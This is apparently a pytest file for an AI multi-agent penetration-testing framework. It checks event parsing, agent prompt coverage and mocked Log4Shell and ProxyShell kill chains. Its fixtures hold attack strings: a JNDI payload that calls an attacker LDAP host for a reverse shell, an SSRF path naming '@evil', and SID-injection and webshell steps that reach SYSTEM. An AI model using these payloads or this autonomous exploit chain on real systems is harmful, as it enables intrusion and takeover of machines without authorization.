"""Pipeline resilience & completeness tests.

Ensures the pipeline handles real-world edge cases and that agent prompts
cover the advanced CVE/CTF techniques needed to take down targets.

1. Resilience: malformed events, empty output, truncated JSON, unknown types
2. Agent prompt validation: keywords for all advanced techniques
3. ScanCompleted events in multi-stage chains
4. MCP server mapping correctness
5. CLI-level integration: mission service wiring
6. Event extraction edge cases
"""

from __future__ import annotations

import json
import pytest
import pytest_asyncio

from miya.shared.blackboard import Blackboard
from miya.shared.events import (
    DomainEvent,
    AssetDiscovered,
    VulnerabilityFound,
    CVEMatched,
    ExploitAttempted,
    ExploitSucceeded,
    ScanCompleted,
    ChallengeIdentified,
    ChallengeSolved,
    PhaseTransition,
    ReflectionCompleted,
    MissionStarted,
    MissionCompleted,
    _EVENT_REGISTRY,
)
from miya.shared.types import MissionType, Mission, Target, Severity
from miya.topology.base import extract_events_from_output, AgentHandle, TopologyRegistry
from miya.infra.event_store import SQLiteEventStore
from miya.infra.mcp_registry import MCPRegistry
from miya.mission.service import MissionService, MissionReport, AGENT_BUILDERS


def _ev(event_type: str, **fields: object) -> str:
    return f'[EVENT:{event_type} {json.dumps(fields)}]'


@pytest_asyncio.fixture
async def store():
    s = SQLiteEventStore(":memory:")
    await s.initialize()
    yield s
    await s.close()


def _make_mission(mission_type: str = "oneday", target: str = "10.0.0.1") -> Mission:
    return Mission(
        mission_type=MissionType(mission_type),
        target=Target(uri=target, kind="service"),
    )


# ═══════════════════════════════════════════════════════════════════
#  1. Event Extraction Resilience
# ═══════════════════════════════════════════════════════════════════


class TestEventExtractionResilience:
    """Verify extract_events_from_output handles real-world LLM output messiness."""

    def test_clean_single_event(self):
        mission = _make_mission()
        output = (
            "I found a target. "
            + _ev("AssetDiscovered", host="10.0.0.1", ip="10.0.0.1",
                  ports=[80], services=["http"], os="Linux", context="recon")
        )
        events = extract_events_from_output(output, mission)
        assert len(events) == 1
        assert isinstance(events[0], AssetDiscovered)
        assert events[0].host == "10.0.0.1"

    def test_multiple_events_in_one_output(self):
        mission = _make_mission()
        output = (
            "Found target and vuln. "
            + _ev("AssetDiscovered", host="10.0.0.1", ip="10.0.0.1",
                  ports=[80, 443], services=["http", "https"],
                  os="Linux", context="recon")
            + " Also: "
            + _ev("VulnerabilityFound", vuln_type="RCE", cwe_id="CWE-917",
                  severity="critical", location="10.0.0.1:80",
                  description="Log4Shell", context="vuln")
            + " And: "
            + _ev("CVEMatched", cve_id="CVE-2021-44228", cvss=10.0,
                  affected_software="Log4j 2.14.1", exploit_available=True,
                  context="vuln")
        )
        events = extract_events_from_output(output, mission)
        assert len(events) == 3
        assert isinstance(events[0], AssetDiscovered)
        assert isinstance(events[1], VulnerabilityFound)
        assert isinstance(events[2], CVEMatched)

    def test_empty_output_returns_no_events(self):
        mission = _make_mission()
        events = extract_events_from_output("", mission)
        assert events == []

    def test_output_without_events_returns_empty(self):
        mission = _make_mission()
        events = extract_events_from_output(
            "I analyzed the target but found nothing notable.", mission
        )
        assert events == []

    def test_malformed_json_skipped_gracefully(self):
        mission = _make_mission()
        output = (
            "Bad event: [EVENT:AssetDiscovered {invalid json here}] "
            "Good event: "
            + _ev("CVEMatched", cve_id="CVE-2021-44228", cvss=10.0,
                  affected_software="Log4j", exploit_available=True,
                  context="vuln")
        )
        events = extract_events_from_output(output, mission)
        # Bad event skipped, good event extracted
        assert len(events) == 1
        assert isinstance(events[0], CVEMatched)

    def test_unknown_event_type_skipped(self):
        mission = _make_mission()
        output = (
            "[EVENT:NonExistentEvent {\"foo\": \"bar\"}] "
            + _ev("AssetDiscovered", host="10.0.0.1", ip="10.0.0.1",
                  ports=[80], services=["http"], os="Linux", context="recon")
        )
        events = extract_events_from_output(output, mission)
        assert len(events) == 1
        assert isinstance(events[0], AssetDiscovered)

    def test_extra_fields_filtered_out(self):
        """Fields not in the dataclass should be silently ignored."""
        mission = _make_mission()
        output = _ev("AssetDiscovered",
                      host="10.0.0.1", ip="10.0.0.1",
                      ports=[80], services=["http"], os="Linux",
                      context="recon",
                      nonexistent_field="should be ignored",
                      another_bad="also ignored")
        events = extract_events_from_output(output, mission)
        assert len(events) == 1
        assert events[0].host == "10.0.0.1"

    def test_tuple_fields_converted_from_lists(self):
        """JSON arrays should be converted to tuples for tuple-typed fields."""
        mission = _make_mission()
        output = _ev("AssetDiscovered",
                      host="10.0.0.1", ip="10.0.0.1",
                      ports=[22, 80, 443, 3306],
                      services=["ssh", "http", "https", "mysql"],
                      os="Linux", context="recon")
        events = extract_events_from_output(output, mission)
        assert len(events) == 1
        asset = events[0]
        assert isinstance(asset.ports, tuple)
        assert asset.ports == (22, 80, 443, 3306)
        assert isinstance(asset.services, tuple)

    def test_mission_context_auto_populated(self):
        """Events without mission field should get it from the mission object."""
        mission = _make_mission("ctf", "https://ctf.example.com")
        output = _ev("ChallengeIdentified",
                      challenge_name="Test", category="web", points=100)
        events = extract_events_from_output(output, mission)
        assert len(events) == 1
        assert events[0].mission == "ctf"

    def test_special_characters_in_json(self):
        """Handle events with special characters (backslashes, quotes)."""
        mission = _make_mission()
        output = _ev("ExploitSucceeded",
                      cve_id="CVE-2021-44228",
                      access_gained="user",
                      evidence="uid=1000(app) groups=1000(app)",
                      context="exploit")
        events = extract_events_from_output(output, mission)
        assert len(events) == 1
        assert events[0].access_gained == "user"

    def test_nested_json_in_description(self):
        """Handle events where description contains JSON-like text."""
        mission = _make_mission()
        output = _ev("VulnerabilityFound",
                      vuln_type="SQLi",
                      cwe_id="CWE-89",
                      severity="high",
                      location="10.0.0.1:443/api",
                      description="SQL injection via {\"user\": \"admin\"}",
                      context="vuln")
        events = extract_events_from_output(output, mission)
        assert len(events) == 1

    def test_severity_values_correctly_parsed(self):
        """All severity levels should be correctly parsed in the blackboard."""
        bb = Blackboard()
        for sev in ("critical", "high", "medium", "low", "info"):
            bb.apply(VulnerabilityFound(
                vuln_type="test",
                cwe_id="CWE-0",
                severity=sev,
                location="test",
                description=f"Test {sev}",
            ))
        assert len(bb.findings) == 5
        severities = {f.severity for f in bb.findings}
        assert Severity.CRITICAL in severities
        assert Severity.HIGH in severities
        assert Severity.INFO in severities


# ═══════════════════════════════════════════════════════════════════
#  2. Agent Prompt Validation — technique coverage
# ═══════════════════════════════════════════════════════════════════


class TestAgentPromptCoverage:
    """Verify agent system prompts cover the techniques needed for advanced scenarios."""

    def _get_agents(self, mission_type: str) -> dict[str, AgentHandle]:
        builder = AGENT_BUILDERS.get(MissionType(mission_type))
        assert builder is not None
        agents = builder()
        assert len(agents) > 0
        return agents

    # ── Oneday Agent Coverage ──────────────────────────────────────

    def test_recon_agent_covers_network_scanning(self):
        agents = self._get_agents("oneday")
        recon = agents["recon"]
        prompt = recon.system_prompt.lower()
        assert "nmap" in prompt or "scan" in prompt or "discover" in prompt
        assert "nmap" in recon.mcp_servers or "shodan" in recon.mcp_servers

    def test_exploit_agent_covers_metasploit(self):
        agents = self._get_agents("oneday")
        exploit = agents["exploit"]
        prompt = exploit.system_prompt.lower()
        assert "exploit" in prompt
        assert any(s in exploit.mcp_servers for s in ("metasploit", "sqlmap"))

    def test_vuln_agent_covers_cve_matching(self):
        agents = self._get_agents("oneday")
        vuln = agents["vuln"]
        prompt = vuln.system_prompt.lower()
        assert "cve" in prompt or "vulnerability" in prompt
        assert "exploitdb" in vuln.mcp_servers or "cve" in prompt

    def test_post_agent_covers_privilege_escalation(self):
        agents = self._get_agents("oneday")
        post = agents["post"]
        prompt = post.system_prompt.lower()
        assert any(kw in prompt for kw in ("privilege", "escalat", "lateral", "post-exploit"))

    def test_scan_agent_covers_vuln_scanning(self):
        agents = self._get_agents("oneday")
        scan = agents["scan"]
        prompt = scan.system_prompt.lower()
        assert "nuclei" in prompt or "scan" in prompt
        assert "nuclei" in scan.mcp_servers

    # ── Zeroday Agent Coverage ─────────────────────────────────────

    def test_entrypoint_agent_covers_frameworks(self):
        agents = self._get_agents("zeroday")
        ep = agents["entrypoint"]
        prompt = ep.system_prompt.lower()
        assert any(fw in prompt for fw in ("flask", "django", "spring", "express", "framework", "route", "endpoint"))

    def test_dataflow_agent_covers_taint_analysis(self):
        agents = self._get_agents("zeroday")
        df = agents["dataflow"]
        prompt = df.system_prompt.lower()
        assert any(kw in prompt for kw in ("taint", "data flow", "dataflow", "source", "sink"))

    def test_sink_agent_covers_vuln_types(self):
        agents = self._get_agents("zeroday")
        sink = agents["sink"]
        prompt = sink.system_prompt.lower()
        assert any(kw in prompt for kw in ("sink", "injection", "ssti", "rce", "deserialization"))

    def test_poc_agent_covers_validation(self):
        agents = self._get_agents("zeroday")
        poc = agents["poc"]
        prompt = poc.system_prompt.lower()
        assert any(kw in prompt for kw in ("poc", "proof", "validate", "exploit", "confirm"))

    # ── CTF Agent Coverage ─────────────────────────────────────────

    def test_web_ctf_covers_injection_techniques(self):
        agents = self._get_agents("ctf")
        web = agents["web"]
        prompt = web.system_prompt.lower()
        assert any(kw in prompt for kw in ("sqli", "sql injection", "xss", "ssti", "ssrf"))

    def test_pwn_ctf_covers_binary_exploitation(self):
        agents = self._get_agents("ctf")
        pwn = agents["pwn"]
        prompt = pwn.system_prompt.lower()
        assert any(kw in prompt for kw in ("buffer overflow", "rop", "heap", "shellcode", "binary"))

    def test_crypto_ctf_covers_cryptanalysis(self):
        agents = self._get_agents("ctf")
        crypto = agents["crypto"]
        prompt = crypto.system_prompt.lower()
        assert any(kw in prompt for kw in ("rsa", "aes", "crypto", "cipher", "key"))

    def test_reverse_ctf_covers_reversing_tools(self):
        agents = self._get_agents("ctf")
        reverse = agents["reverse"]
        prompt = reverse.system_prompt.lower()
        assert any(kw in prompt for kw in ("ghidra", "ida", "decompil", "disassembl", "reverse"))
        assert "ghidra" in reverse.mcp_servers

    def test_misc_ctf_covers_forensics(self):
        agents = self._get_agents("ctf")
        misc = agents["misc"]
        prompt = misc.system_prompt.lower()
        assert any(kw in prompt for kw in ("forensic", "steg", "misc", "encoding"))

    # ── All agents have valid definitions ──────────────────────────

    @pytest.mark.parametrize("mission_type", ["oneday", "zeroday", "ctf"])
    def test_all_agents_have_valid_handles(self, mission_type):
        agents = self._get_agents(mission_type)
        for name, handle in agents.items():
            assert handle.name, f"{name}: missing name"
            assert handle.description, f"{name}: missing description"
            assert handle.system_prompt, f"{name}: missing system_prompt"
            assert len(handle.system_prompt) > 50, f"{name}: prompt too short"
            assert handle.tools, f"{name}: missing tools"
            defn = handle.to_agent_definition()
            assert "description" in defn
            assert "prompt" in defn
            assert "tools" in defn


# ═══════════════════════════════════════════════════════════════════
#  3. MCP Server Mapping Correctness
# ═══════════════════════════════════════════════════════════════════


class TestMCPServerMapping:
    """Verify MCP servers are correctly configured for each scenario type."""

    def test_all_mcp_servers_registered(self):
        registry = MCPRegistry()
        expected = {"semgrep", "nmap", "nuclei", "shodan", "metasploit",
                    "sqlmap", "exploitdb", "ghidra", "gdb"}
        available = set(registry.available())
        assert expected <= available, f"Missing MCP servers: {expected - available}"

    def test_oneday_agents_have_security_tools(self):
        agents = AGENT_BUILDERS[MissionType.ONEDAY]()
        all_mcp = set()
        for h in agents.values():
            all_mcp.update(h.mcp_servers)
        # Oneday missions need network scanning + exploitation tools
        assert any(s in all_mcp for s in ("nmap", "nuclei")), "Need scanning tools"
        assert any(s in all_mcp for s in ("metasploit", "sqlmap", "exploitdb")), "Need exploit tools"

    def test_zeroday_agents_have_code_analysis(self):
        agents = AGENT_BUILDERS[MissionType.ZERODAY]()
        all_mcp = set()
        for h in agents.values():
            all_mcp.update(h.mcp_servers)
        assert "semgrep" in all_mcp, "0-day needs semgrep for code analysis"

    def test_ctf_agents_have_category_tools(self):
        agents = AGENT_BUILDERS[MissionType.CTF]()
        all_mcp = set()
        for h in agents.values():
            all_mcp.update(h.mcp_servers)
        assert "ghidra" in all_mcp, "CTF needs ghidra for reverse engineering"

    def test_mcp_configs_are_valid(self):
        registry = MCPRegistry()
        for server_name in registry.available():
            configs = registry.get_configs_for_agent([server_name])
            assert isinstance(configs, dict)


# ═══════════════════════════════════════════════════════════════════
#  4. Advanced CVE Chain with ScanCompleted Events
# ═══════════════════════════════════════════════════════════════════


class ScanAwareCoordinator:
    """Coordinator that emits ScanCompleted events for realistic chains."""

    def __init__(self, responses: list[dict[str, str]]) -> None:
        self.calls: list[dict] = []
        self._responses = responses
        self._iter = 0

    async def run(self, prompt: str, agents: dict, mcp_servers: list[str]) -> str:
        self.calls.append({"prompt_len": len(prompt)})

        phase = None
        for p in ("OBSERVE", "ORIENT", "DECIDE", "ACT", "REFLECT"):
            if f"Phase: {p}" in prompt:
                phase = p
                break

        if phase == "REFLECT":
            idx = min(self._iter, len(self._responses) - 1)
            resp = self._responses[idx].get("REFLECT", "DECISION: complete")
            self._iter += 1
            return resp

        idx = min(self._iter, len(self._responses) - 1)
        if phase and phase in self._responses[idx]:
            return self._responses[idx][phase]
        return f"[Mock #{len(self.calls)}]"


class TestRealisticCVEChainWithScan:
    """E2E test with full recon → scan → vuln → exploit chain including ScanCompleted."""

    @pytest.mark.asyncio
    async def test_log4shell_full_killchain_with_scan(self, store):
        """Complete Log4Shell kill chain with ScanCompleted event."""
        iterations = [
            {
                "OBSERVE": (
                    "Nmap scan complete. Found Java web app. "
                    + _ev("AssetDiscovered",
                          aggregate_id="asset-full-1",
                          host="10.0.0.5", ip="10.0.0.5",
                          ports=[22, 8080, 9200],
                          services=["ssh", "http", "elasticsearch"],
                          os="Ubuntu 22.04", context="recon")
                    + " "
                    + _ev("ScanCompleted",
                          target_host="10.0.0.5",
                          target_ports=[8080, 9200],
                          findings_count=3,
                          scanner="nuclei",
                          context="scan")
                ),
                "ORIENT": (
                    "Nuclei identified Log4Shell. "
                    + _ev("VulnerabilityFound",
                          vuln_type="Remote Code Execution",
                          cwe_id="CWE-917",
                          severity="critical",
                          location="10.0.0.5:8080",
                          description="JNDI injection in Log4j2 via HTTP headers",
                          context="vuln")
                    + " "
                    + _ev("CVEMatched",
                          cve_id="CVE-2021-44228",
                          cvss=10.0,
                          affected_software="Apache Log4j 2.14.1",
                          exploit_available=True,
                          context="vuln")
                ),
                "DECIDE": "Plan: JNDI injection via User-Agent header → reverse shell.",
                "ACT": (
                    "Exploit SUCCESS. "
                    + _ev("ExploitAttempted",
                          cve_id="CVE-2021-44228",
                          technique="JNDI injection via User-Agent",
                          payload_summary="${jndi:ldap://10.0.0.99:1389/a}",
                          context="exploit")
                    + " "
                    + _ev("ExploitSucceeded",
                          cve_id="CVE-2021-44228",
                          access_gained="user",
                          evidence="uid=1000(tomcat) gid=1000(tomcat)",
                          context="exploit")
                ),
                "REFLECT": (
                    "DECISION: complete\n"
                    "ASSESSMENT: Log4Shell exploited, user shell obtained\n"
                    "INSIGHTS: Log4j 2.14.1 JNDI injection successful\n"
                    "NEXT_FOCUS: n/a"
                ),
            },
        ]

        mock = ScanAwareCoordinator(iterations)
        service = MissionService(event_store=store, coordinator=mock)

        report = await service.execute(
            mission_type="oneday",
            target_uri="10.0.0.5",
            topology="ooda",
        )

        assert report.status == "completed"
        summary = report.blackboard_summary

        # Full kill chain verification
        assert summary["assets"] >= 1
        assert summary["findings"] >= 1
        assert summary["cve_matches"] >= 1
        assert summary["exploit_attempts"] >= 1
        assert summary["access_level"] == "user"

        # Verify ScanCompleted event was persisted
        all_events = await store.load_all()
        scan_events = [e for e in all_events if isinstance(e, ScanCompleted)]
        assert len(scan_events) >= 1
        assert scan_events[0].scanner == "nuclei"
        assert scan_events[0].findings_count == 3

        # Full event chain present
        event_types = {type(e).__name__ for e in all_events}
        assert "MissionStarted" in event_types
        assert "PhaseTransition" in event_types
        assert "AssetDiscovered" in event_types
        assert "ScanCompleted" in event_types
        assert "VulnerabilityFound" in event_types
        assert "CVEMatched" in event_types
        assert "ExploitAttempted" in event_types
        assert "ExploitSucceeded" in event_types
        assert "ReflectionCompleted" in event_types
        assert "MissionCompleted" in event_types

        # Report quality
        text = report.as_text()
        assert "CRITICAL" in text
        assert report.critical_count >= 1

    @pytest.mark.asyncio
    async def test_proxyshell_with_scan_events(self, store):
        """ProxyShell chain with scan phase at each stage."""
        iterations = [
            # Stage 1: SSRF discovery
            {
                "OBSERVE": (
                    "Scanning Exchange. "
                    + _ev("AssetDiscovered",
                          aggregate_id="asset-exchange",
                          host="exchange.corp.local", ip="10.10.0.5",
                          ports=[443], services=["https"],
                          os="Windows Server 2019", context="recon")
                    + " "
                    + _ev("ScanCompleted",
                          target_host="exchange.corp.local",
                          target_ports=[443],
                          findings_count=5,
                          scanner="nuclei",
                          context="scan")
                ),
                "ORIENT": (
                    "SSRF identified. "
                    + _ev("VulnerabilityFound",
                          vuln_type="SSRF", cwe_id="CWE-918",
                          severity="critical",
                          location="exchange.corp.local:443/autodiscover",
                          description="Pre-auth SSRF bypasses ACL",
                          context="vuln")
                    + " "
                    + _ev("CVEMatched",
                          cve_id="CVE-2021-34473", cvss=9.1,
                          affected_software="Exchange 2019 CU9",
                          exploit_available=True, context="vuln")
                ),
                "DECIDE": "Exploit SSRF to reach backend.",
                "ACT": (
                    "SSRF exploited. "
                    + _ev("ExploitAttempted",
                          cve_id="CVE-2021-34473",
                          technique="Path confusion SSRF",
                          payload_summary="/autodiscover/autodiscover.json?@evil/mapi",
                          context="exploit")
                    + " "
                    + _ev("ExploitSucceeded",
                          cve_id="CVE-2021-34473",
                          access_gained="backend_access",
                          evidence="X-CalculatedBETarget: exchange-be",
                          context="exploit")
                ),
                "REFLECT": (
                    "DECISION: continue\n"
                    "ASSESSMENT: SSRF gives backend access, now escalate\n"
                    "INSIGHTS: Exchange backend reachable\n"
                    "NEXT_FOCUS: PowerShell elevation via SID injection"
                ),
            },
            # Stage 2: Elevation + Webshell
            {
                "OBSERVE": "Backend accessible. Checking PowerShell remoting.",
                "ORIENT": (
                    "Elevation path confirmed. "
                    + _ev("VulnerabilityFound",
                          vuln_type="Privilege Escalation", cwe_id="CWE-287",
                          severity="critical",
                          location="exchange.corp.local:443/powershell",
                          description="SID injection in backend PowerShell",
                          context="vuln")
                    + " "
                    + _ev("CVEMatched",
                          cve_id="CVE-2021-34523", cvss=9.8,
                          affected_software="Exchange 2019 CU9",
                          exploit_available=True, context="vuln")
                ),
                "DECIDE": "Inject admin SID to gain Exchange admin, then drop webshell.",
                "ACT": (
                    "Full chain exploited. "
                    + _ev("CVEMatched",
                          cve_id="CVE-2021-31207", cvss=7.2,
                          affected_software="Exchange 2019 CU9",
                          exploit_available=True, context="vuln")
                    + " "
                    + _ev("ExploitAttempted",
                          cve_id="CVE-2021-34523",
                          technique="SID injection + webshell",
                          payload_summary="X-Rps-CAT: admin SID → New-MailboxExportRequest",
                          context="exploit")
                    + " "
                    + _ev("ExploitSucceeded",
                          cve_id="CVE-2021-31207",
                          access_gained="system",
                          evidence="NT AUTHORITY\\SYSTEM via webshell",
                          context="exploit")
                ),
                "REFLECT": (
                    "DECISION: complete\n"
                    "ASSESSMENT: Full ProxyShell chain exploited\n"
                    "INSIGHTS: SSRF → Elevation → Webshell = SYSTEM\n"
                    "NEXT_FOCUS: n/a"
                ),
            },
        ]

        mock = ScanAwareCoordinator(iterations)
        service = MissionService(event_store=store, coordinator=mock)

        report = await service.execute(
            mission_type="oneday",
            target_uri="exchange.corp.local",
            topology="ooda",
        )

        assert report.status == "completed"
        summary = report.blackboard_summary

        # ProxyShell chain verification
        assert summary["access_level"] == "system"
        assert summary["cve_matches"] >= 3  # 3 CVEs
        assert summary["exploit_attempts"] >= 2

        # Scan event present
        all_events = await store.load_all()
        scans = [e for e in all_events if isinstance(e, ScanCompleted)]
        assert len(scans) >= 1

        # All 3 CVEs matched
        cves = [e for e in all_events if isinstance(e, CVEMatched)]
        cve_ids = {e.cve_id for e in cves}
        assert "CVE-2021-34473" in cve_ids
        assert "CVE-2021-34523" in cve_ids


# ═══════════════════════════════════════════════════════════════════
#  5. Topology Registry & Service Wiring
# ═══════════════════════════════════════════════════════════════════


class TestServiceWiring:
    """Verify the service layer correctly wires topologies and agents."""

    @pytest.mark.asyncio
    async def test_invalid_mission_type_raises(self, store):
        service = MissionService(event_store=store)
        with pytest.raises(ValueError, match="is not a valid MissionType"):
            await service.execute(
                mission_type="invalid_type",
                target_uri="test",
            )

    @pytest.mark.asyncio
    async def test_invalid_topology_raises(self, store):
        service = MissionService(event_store=store)
        with pytest.raises(ValueError, match="Unknown topology"):
            await service.execute(
                mission_type="oneday",
                target_uri="test",
                topology="nonexistent",
            )

    def test_topology_registry_has_both(self):
        available = TopologyRegistry.available()
        assert "ooda" in available
        assert "attack_graph" in available

    def test_topology_descriptions_non_empty(self):
        descriptions = TopologyRegistry.describe_all()
        assert len(descriptions) >= 2
        for d in descriptions:
            assert d["name"]
            assert d["description"]
            assert len(d["description"]) > 20

    @pytest.mark.asyncio
    async def test_mission_service_creates_with_factory(self):
        service = await MissionService.create(db_path=":memory:")
        topos = await service.list_topologies()
        assert len(topos) >= 2
        servers = await service.list_mcp_servers()
        assert len(servers) >= 9
        await service.close()


# ═══════════════════════════════════════════════════════════════════
#  6. Event Registry Completeness
# ═══════════════════════════════════════════════════════════════════


class TestEventRegistryCompleteness:
    """Verify all event types are registered and extractable."""

    def test_all_event_types_in_registry(self):
        expected_types = {
            "mission.started", "mission.completed", "mission.failed",
            "topology.phase_transition", "topology.reflection",
            "recon.asset_discovered", "recon.fingerprint_completed",
            "scan.completed",
            "vuln.found", "vuln.cve_matched",
            "exploit.attempted", "exploit.succeeded", "exploit.failed",
            "zeroday.entrypoint_discovered", "zeroday.taint_path_traced",
            "zeroday.sink_confirmed", "zeroday.poc_validated",
            "ctf.challenge_identified", "ctf.challenge_solved",
            "post.privilege_escalated", "post.loot_collected",
        }
        registered = set(_EVENT_REGISTRY.keys())
        missing = expected_types - registered
        assert not missing, f"Missing event types: {missing}"

    def test_event_class_names_unique(self):
        """Each event class should have a unique name (used for extraction)."""
        class_names = [cls.__name__ for cls in _EVENT_REGISTRY.values()]
        assert len(class_names) == len(set(class_names)), "Duplicate class names"

    def test_all_events_extractable_from_output(self):
        """Verify every event type can be extracted from coordinator output."""
        mission = _make_mission()
        extractable = [
            _ev("AssetDiscovered", host="h", ip="1.2.3.4", ports=[80],
                 services=["http"], os="Linux", context="recon"),
            _ev("VulnerabilityFound", vuln_type="t", cwe_id="CWE-1",
                 severity="high", location="l", description="d", context="vuln"),
            _ev("CVEMatched", cve_id="CVE-1", cvss=9.0,
                 affected_software="s", exploit_available=True, context="vuln"),
            _ev("ExploitAttempted", cve_id="CVE-1", technique="t",
                 payload_summary="p", context="exploit"),
            _ev("ExploitSucceeded", cve_id="CVE-1", access_gained="user",
                 evidence="e", context="exploit"),
            _ev("ChallengeIdentified", challenge_name="c", category="web",
                 points=100, context="ctf"),
            _ev("ChallengeSolved", challenge_name="c", flag="flag{t}",
                 approach="a", context="ctf"),
            _ev("EntryPointDiscovered", endpoint="/api", input_vectors=["q:a"],
                 framework="Flask", context="entrypoint"),
            _ev("TaintPathTraced", source="s", sink="k", path=["a", "b"],
                 sanitized=False, context="dataflow"),
            _ev("SinkConfirmed", sink_type="SSTI", cwe_id="CWE-1336",
                 exploitability="high", context="sink"),
            _ev("PoCValidated", vuln_type="SSTI", poc_code="curl ...",
                 result="success", context="poc"),
        ]

        output = " ".join(extractable)
        events = extract_events_from_output(output, mission)
        assert len(events) == 11, f"Expected 11 events, got {len(events)}"

        type_names = {type(e).__name__ for e in events}
        assert "AssetDiscovered" in type_names
        assert "VulnerabilityFound" in type_names
        assert "CVEMatched" in type_names
        assert "ExploitAttempted" in type_names
        assert "ExploitSucceeded" in type_names
        assert "ChallengeIdentified" in type_names
        assert "ChallengeSolved" in type_names
        assert "EntryPointDiscovered" in type_names
        assert "TaintPathTraced" in type_names
        assert "SinkConfirmed" in type_names
        assert "PoCValidated" in type_names
